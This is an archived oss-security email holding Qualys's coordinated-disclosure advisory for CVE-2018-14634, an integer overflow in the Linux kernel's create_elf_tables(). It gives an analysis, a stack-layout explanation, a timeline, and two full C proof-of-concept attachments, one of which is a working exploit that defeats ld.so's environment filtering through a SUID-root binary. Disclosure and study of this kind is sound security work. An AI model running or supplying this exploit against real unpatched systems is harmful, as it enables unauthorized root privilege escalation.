X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["17628" "Tuesday" "25" "September" "2018" "10:07:53" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20180925170753.GA13142@localhost.localdomain>" "491" "[oss-security] Integer overflow in Linux's create_elf_tables() (CVE-2018-14634)" nil nil nil "9" "2018092517:07:53" "[oss-security] Integer overflow in Linux's create_elf_tables() (CVE-2018-14634)" (number mark "U       qsa@qualys.c Sep 25  491/17628 " thread-indent "\"[oss-security] Integer overflow in Linux's create_elf_tables() (CVE-2018-14634)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26288 invoked by uid 550); 25 Sep 2018 17:13:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26270 invoked from network); 25 Sep 2018 17:13:16 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=qualys.com; s=google;
        h=date:from:to:subject:message-id:mime-version:content-disposition;
        bh=C6fe6C5Ae7PfeSsnW27SwQkmrg1HMnkdTYmsP8GCjjA=;
        b=iwOJobK6hT8pN0Oiim/uBrGoeszTOxxd7DEL1MqhO6wks/lRj26dptPkgKLZkS7Pvk
         3NHA6W9W3NIXBn35Q31KV+40PeSdJEn9+C1gfRAYMbcS9eGyxQr2UYvTcHr5Rx0JLCbf
         dKgARAEAhy7ryc0w/lPBkZtp3JYNp4MvSwhlmWy8t0f2lbFb9nTiIqY6wEJCinKlcd7b
         i7ZYLeUDyyhy8MokUIc8MuRFKa9kW+iVifMJMpuuA3c30yM9SFHWIIwlt1AB2JcVVKtH
         ZnXxwNdYKdfekj6JAIoZt34OkoLAtKBBRNBDaVS4//vmZFqdChY2G+Mj7guFI3EnNTG2
         EzMg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:subject:message-id:mime-version
         :content-disposition;
        bh=C6fe6C5Ae7PfeSsnW27SwQkmrg1HMnkdTYmsP8GCjjA=;
        b=b3liKqR5ze3jwkehGT3dkNYOWT7ORouxerOf+voPhSEThp5+TmM5DoeXgTR6fhs0o7
         8T1fvhMNoubI/W7lbbiFVr8f+cx44xqa7e0jEOrhvx5Io4LLuK3UcdxzLA3IpaKlbHrX
         jjn9KK3ornFhMZl6gXw7IU7/wrhjNxZwhnfbI2uPe2+ecINmdDkpDscIKXuh4WIqZZ3h
         qFPvWuLtScs8CjrdT2jX7uhVk0vkDFzbSb6oh6EGjnNsVJv01Wtgoq5MoRxRV1NpBTaP
         U0EXaGJRr/y2/toGzoC8+5EPGbPUHSLmSKsyM7HEBAy5i/FqGReICBkGvlKGxXqf+T2K
         MYLQ==
X-Gm-Message-State: ABuFfohdAkL44yxZI4LaeRBNAati/QVFZg1z/o3jbJk/zmoeOasWw7FA
	QBa+e0csBX+rqrCt3Lhd6/LwlAE60GgOjQ==
X-Google-Smtp-Source: ACcGV61u+lp5Sr8z1TLqGK+eAzld0Qtr/BhAynisHzACsUPOHzDQXK/fjJlLxx4jjins9PVSumN1hw==
X-Received: by 2002:a63:1f58:: with SMTP id q24-v6mr1954475pgm.88.1537895583130;
        Tue, 25 Sep 2018 10:13:03 -0700 (PDT)
Date: Tue, 25 Sep 2018 10:07:53 -0700
From: Qualys Security Advisory <qsa@qualys.com>
To: oss-security@lists.openwall.com
Message-ID: <20180925170753.GA13142@localhost.localdomain>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="FCuugMFkClbJLl1L"
Content-Disposition: inline
Subject: [oss-security] Integer overflow in Linux's create_elf_tables() (CVE-2018-14634)

--FCuugMFkClbJLl1L
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline


Qualys Security Advisory

Mutagen Astronomy: Integer overflow in Linux's create_elf_tables()
(CVE-2018-14634)


========================================================================
Contents
========================================================================

Summary
Analysis
Exploitation
Acknowledgments
Timeline


========================================================================
Summary
========================================================================

We discovered an integer overflow in the Linux kernel's
create_elf_tables() function: on a 64-bit system, a local attacker can
exploit this vulnerability via a SUID-root binary and obtain full root
privileges.

Only kernels with commit b6a2fea39318 ("mm: variable length argument
support", from July 19, 2007) but without commit da029c11e6b1 ("exec:
Limit arg stack to at most 75% of _STK_LIM", from July 7, 2017) are
exploitable.

Most Linux distributions backported commit da029c11e6b1 to their
long-term-supported kernels, but Red Hat Enterprise Linux and CentOS
(and Debian 8, the current "oldstable" version) have not, and are
therefore vulnerable and exploitable.


========================================================================
Analysis
========================================================================

 150 #define STACK_ROUND(sp, items) \
 151         (((unsigned long) (sp - items)) &~ 15UL)
 ...
 165 create_elf_tables(struct linux_binprm *bprm, struct elfhdr *exec,
 ...
 169         int argc = bprm->argc;
 170         int envc = bprm->envc;
 171         elf_addr_t __user *sp;
 ...
 178         int items;
 ...
 190         p = arch_align_stack(p);
 ...
 287         items = (argc + 1) + (envc + 1) + 1;
 288         bprm->p = STACK_ROUND(sp, items);
 ...
 295         sp = (elf_addr_t __user *)bprm->p;

"argc", the number of command-line arguments passed to the execve()
system call, is limited to MAX_ARG_STRINGS (in fs/exec.c); "envc", the
number of environment variables passed to execve(), is also limited to
MAX_ARG_STRINGS; but because MAX_ARG_STRINGS is 0x7FFFFFFF, we can
overflow the integer "items" (at line 287) and make it negative.

As a result, we can increase the userland stack pointer instead of
decreasing it (at lines 288 and 295 -- the stack normally grows down on
x86_64), redirect the userland stack to the middle of our argument and
environment strings (which were copied to the top of the stack in
fs/exec.c), and hence overwrite these strings during the userland
execution of a SUID-root binary.


========================================================================
Exploitation
========================================================================

We execve() a SUID-root binary with exactly 0x80000000 "items" (i.e.,
INT_MIN "items"): roughly 0x80000000 * sizeof(char *) = 16GB of argument
pointers, 16GB of argument strings, and 16GB of environment strings. Our
exploit requires "only" 2 * 16GB = 32GB of memory, instead of 3 * 16GB =
48GB or more, because we use a few tricks to reduce its memory footprint
(for example, we replace the nearly 16GB of equal argument pointers with
equivalent file-backed mappings that consume practically no memory).

The following diagram represents the layout of our userland stack when
the execution of the SUID-root binary starts, in ld.so:

               | argument strings  |          environment strings          |
--|---|--------|---------+---------|---------+---------+---------+---------|--
  | A | sprand | protect | padding | protect | scratch | onebyte | padding |
--|---|--------|---------+---------|---------+---------+------^--+---------|--
  |     0-8192              ~16GB                1MB         rsp    ~16GB
  v                                               <-------+---|----------|
  |                                                 stack | B | pointers |
  \-------------->-------------->-------------->--------------/   16GB
             0x80000000 * sizeof(elf_addr_t) = 16GB

- "A" ("alpha") is the amount of stack space allocated by
  create_elf_tables() between lines 190 and 287 exclusive (for example,
  the platform and base-platform capability strings): it is
  approximately 512 bytes.

- "sprand" is a random amount of stack space allocated by
  create_elf_tables() at line 190: it varies from 0 to 8192 bytes.

- The "protect" argument strings are vital command-line arguments and
  options that must be safe from memory corruption (for example,
  argv[0], the filename of the SUID-root binary).

- The "padding" argument strings occupy roughly 16GB of stack space.

- The "protect" environment strings are vital environment variables that
  must be safe from memory corruption (for example, our LD_PRELOAD
  environment variable, which will be processed by ld.so's
  handle_ld_preload() function).

- The "scratch" environment strings are 1MB of safe stack space for the
  userland execution of the SUID-root binary: the integer overflow of
  "items" redirects the userland stack pointer "rsp" to the middle of
  our argument and environment strings (to an offset of 0x80000000 *
  sizeof(elf_addr_t) = 16GB) -- more precisely, to the middle of our
  "onebyte" environment strings.

- The "onebyte" environment strings are 256KB of one-byte (empty)
  environment variables that will be partly overwritten by the 4KB
  fname[] buffer in ld.so's handle_ld_preload() function.

- The "padding" environment strings occupy roughly 16GB of stack space.

- The 16GB of argument and environment "pointers" (i.e., the argv[] and
  envp[] arrays) are written on top of our "padding" environment strings
  by create_elf_tables(), after the integer overflow of "items" and the
  redirection of the userland stack pointer "rsp".

- "B" ("beta") is the amount of stack space allocated by ld.so before
  the call to handle_ld_preload(): it is approximately 9KB and is
  allocated in the middle of our "onebyte" environment strings.

As a result, ld.so partly overwrites (i.e., rewrites) our "onebyte"
environment variables with the fname[] buffer in handle_ld_preload()
(whose contents we control through our LD_PRELOAD environment variable)
and thereby nullifies process_envvars()'s filtering of UNSECURE_ENVVARS
(LD_AUDIT, LD_LIBRARY_PATH, LD_PRELOAD, etc). The exploitation of this
lack of UNSECURE_ENVVARS filtering in ld.so (via a suitable SUID-root
binary) is left as an exercise for the interested reader.

Our proof-of-concept (poc-exploit.c) exploits the integer overflow in
create_elf_tables() and the resulting lack of UNSECURE_ENVVARS filtering
in ld.so: it executes the main() of a SUID-root binary (poc-suidbin.c)
while LD_LIBRARY_PATH remains set, even though it should have been
removed from the environment variables by ld.so. Demonstration:

# gcc -O0 -o poc-suidbin poc-suidbin.c
# chown root poc-suidbin
# chmod 4555 poc-suidbin

$ gcc -o poc-exploit poc-exploit.c
$ time ./poc-exploit
...
ERROR: ld.so: object 'LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
ERROR: ld.so: object 'LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
ERROR: ld.so: object 'LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
argc 2147090419
stack 0x7ffbe115008f < 0x7ffbe1150188 < 0x7fffe0e50128 < 0x7ff7e11503ea < 0x7ffbe102cdea
getenv 0x7ffbe114d83b .
0x7ffbe114d82b LD_LIBRARY_PATH=.
0x7ffbe114df60 LD_LIBRARY_PATH=.
0x7ffbe114df72 LD_LIBRARY_PATH=.
...
0x7ffbe114e69e LD_LIBRARY_PATH=.
0x7ffbe114e6b0 LD_LIBRARY_PATH=.
0x7ffbe114e6c2 LD_LIBRARY_PATH=.

real    5m38.666s
user    0m0.049s
sys     1m57.828s


========================================================================
Acknowledgments
========================================================================

We thank Red Hat Product Security and the members of
linux-distros@vs.openwall.org and security@kernel.org.


========================================================================
Timeline
========================================================================

2018-08-31: Contacted secalert@redhat.com.

2018-09-18: Contacted linux-distros@vs.openwall.org and
security@kernel.org.

2018-09-25: Coordinated Release Date (Time: 5:00 PM UTC).


--FCuugMFkClbJLl1L
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="poc-suidbin.c"

/*
 * poc-suidbin.c for CVE-2018-14634
 * Copyright (C) 2018 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(const int argc, const char * const * const argv, const char * const * const envp)
{
    printf("argc %d\n", argc);

    char stack = '\0';
    printf("stack %p < %p < %p < %p < %p\n", &stack, argv, envp, *argv, *envp);

    #define LLP "LD_LIBRARY_PATH"
    const char * const llp = getenv(LLP);
    printf("getenv %p %s\n", llp, llp);

    const char * const * env;
    for (env = envp; *env; env++) {
        if (!strncmp(*env, LLP, sizeof(LLP)-1)) {
            printf("%p %s\n", *env, *env);
        }
    }
    exit(EXIT_SUCCESS);
}

--FCuugMFkClbJLl1L
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="poc-exploit.c"

/*
 * poc-exploit.c for CVE-2018-14634
 * Copyright (C) 2018 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <limits.h>
#include <paths.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define MAPCOUNT_ELF_CORE_MARGIN        (5)
#define DEFAULT_MAX_MAP_COUNT   (USHRT_MAX - MAPCOUNT_ELF_CORE_MARGIN)

#define PAGESZ ((size_t)4096)
#define MAX_ARG_STRLEN ((size_t)128 << 10)
#define MAX_ARG_STRINGS ((size_t)0x7FFFFFFF)

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(void)
{
    if (sizeof(size_t) != sizeof(uint64_t)) die();
    const size_t alpha = 512;
    const size_t sprand = 8192;
    const size_t beta = (size_t)9 << 10;
    const size_t items = (size_t)1 << 31;
    const size_t offset = items * sizeof(uintptr_t);

    #define LLP "LD_LIBRARY_PATH=."
    static char preload_env[MAX_ARG_STRLEN];
  {
    char * const sp = stpcpy(preload_env, "LD_PRELOAD=");
    char * cp = preload_env + sizeof(preload_env);
    size_t n;
    for (n = 1; n <= (size_t)(cp - sp) / sizeof(LLP); n++) {
        size_t i;
        for (i = n; i; i--) {
            *--cp = (n == 1) ? '\0' : (i == n) ? ':' : '0';
            cp -= sizeof(LLP)-1;
            memcpy(cp, LLP, sizeof(LLP)-1);
        }
    }
    memset(sp, ':', (size_t)(cp - sp));
    if (memchr(preload_env, '\0', sizeof(preload_env)) !=
                    preload_env + sizeof(preload_env)-1) die();
  }
    const char * const protect_envp[] = {
        preload_env,
    };
    const size_t protect_envc = sizeof(protect_envp) / sizeof(protect_envp[0]);
    size_t _protect_envsz = 0;
  {
    size_t i;
    for (i = 0; i < protect_envc; i++) {
        _protect_envsz += strlen(protect_envp[i]) + 1;
    }
  }
    const size_t protect_envsz = _protect_envsz;

    const size_t scratch_envsz = (size_t)1 << 20;
    const size_t scratch_envc = scratch_envsz / MAX_ARG_STRLEN;
    if (scratch_envsz % MAX_ARG_STRLEN) die();
    static char scratch_env[MAX_ARG_STRLEN];
    memset(scratch_env, ' ', sizeof(scratch_env)-1);

    const size_t onebyte_envsz = (size_t)256 << 10;
    const size_t onebyte_envc = onebyte_envsz / 1;

    const size_t padding_envsz = offset + alpha;
    /***/ size_t padding_env_rem = padding_envsz % MAX_ARG_STRLEN;
    const size_t padding_envc = padding_envsz / MAX_ARG_STRLEN + !!padding_env_rem;
    static char padding_env[MAX_ARG_STRLEN];
    memset(padding_env, ' ', sizeof(padding_env)-1);
    static char padding_env1[MAX_ARG_STRLEN];
    if (padding_env_rem) memset(padding_env1, ' ', padding_env_rem-1);

    const size_t envc = protect_envc + scratch_envc + onebyte_envc + padding_envc;
    if (envc > MAX_ARG_STRINGS) die();

    const size_t argc = items - (1 + 1 + envc + 1);
    if (argc > MAX_ARG_STRINGS) die();

    const char * const protect_argv[] = {
        "./poc-suidbin",
    };
    const size_t protect_argc = sizeof(protect_argv) / sizeof(protect_argv[0]);
    if (protect_argc >= argc) die();
    size_t _protect_argsz = 0;
  {
    size_t i;
    for (i = 0; i < protect_argc; i++) {
        _protect_argsz += strlen(protect_argv[i]) + 1;
    }
  }
    const size_t protect_argsz = _protect_argsz;

    const size_t padding_argc = argc - protect_argc;
    const size_t padding_argsz = (offset - beta) - (alpha + sprand / 2 +
                   protect_argsz + protect_envsz + scratch_envsz + onebyte_envsz / 2);
    const size_t padding_arg_len = padding_argsz / padding_argc;
    /***/ size_t padding_arg_rem = padding_argsz % padding_argc;
    if (padding_arg_len >= MAX_ARG_STRLEN) die();
    if (padding_arg_len < 1) die();
    static char padding_arg[MAX_ARG_STRLEN];
    memset(padding_arg, ' ', padding_arg_len-1);
    static char padding_arg1[MAX_ARG_STRLEN];
    memset(padding_arg1, ' ', padding_arg_len);

    const char ** const envp = calloc(envc + 1, sizeof(char *));
    if (!envp) die();
  {
    size_t envi = 0;
    size_t i;
    for (i = 0; i < protect_envc; i++) {
        envp[envi++] = protect_envp[i];
    }
    for (i = 0; i < scratch_envc; i++) {
        envp[envi++] = scratch_env;
    }
    for (i = 0; i < onebyte_envc; i++) {
        envp[envi++] = "";
    }
    for (i = 0; i < padding_envc; i++) {
        if (padding_env_rem) {
            envp[envi++] = padding_env1;
            padding_env_rem = 0;
        } else {
            envp[envi++] = padding_env;
        }
    }
    if (envi != envc) die();
    if (envp[envc] != NULL) die();
    if (padding_env_rem) die();
  }

    const size_t filemap_size = ((padding_argc - padding_arg_rem) * sizeof(char *) / (DEFAULT_MAX_MAP_COUNT / 2) + PAGESZ-1) & ~(PAGESZ-1);
    const size_t filemap_nptr = filemap_size / sizeof(char *);
    char filemap_name[] = _PATH_TMP "argv.XXXXXX";
    const int filemap_fd = mkstemp(filemap_name);
    if (filemap_fd <= -1) die();
    if (unlink(filemap_name)) die();
  {
    size_t i;
    for (i = 0; i < filemap_nptr; i++) {
        const char * const ptr = padding_arg;
        if (write(filemap_fd, &ptr, sizeof(ptr)) != (ssize_t)sizeof(ptr)) die();
    }
  }
  {
    struct stat st;
    if (fstat(filemap_fd, &st)) die();
    if ((size_t)st.st_size != filemap_size) die();
  }

    const char ** const argv = mmap(NULL, (argc + 1) * sizeof(char *), PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (argv == MAP_FAILED) die();
    if (protect_argc > PAGESZ / sizeof(char *)) die();
    if (mmap(argv, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argv) die();
  {
    size_t argi = 0;
  {
    size_t i;
    for (i = 0; i < protect_argc; i++) {
        argv[argi++] = protect_argv[i];
    }
  }
  {
    size_t n = padding_argc;
    while (n) {
        void * const argp = &argv[argi];
        if (((uintptr_t)argp & (PAGESZ-1)) == 0) {
            if (padding_arg_rem || n < filemap_nptr) {
                if (mmap(argp, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argp) die();
            } else {
                if (mmap(argp, filemap_size, PROT_READ, MAP_FIXED | MAP_PRIVATE, filemap_fd, 0) != argp) die();
                argi += filemap_nptr;
                n -= filemap_nptr;
                continue;
            }
        }
        if (padding_arg_rem) {
            argv[argi++] = padding_arg1;
            padding_arg_rem--;
        } else {
            argv[argi++] = padding_arg;
        }
        n--;
    }
  }
    if (argi != argc) die();
    if (argv[argc] != NULL) die();
    if (padding_arg_rem) die();
  }

  {
    static const struct rlimit stack_limit = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    if (setrlimit(RLIMIT_STACK, &stack_limit)) die();
  }
    execve(argv[0], (char * const *)argv, (char * const *)envp);
    die();
}

--FCuugMFkClbJLl1L--
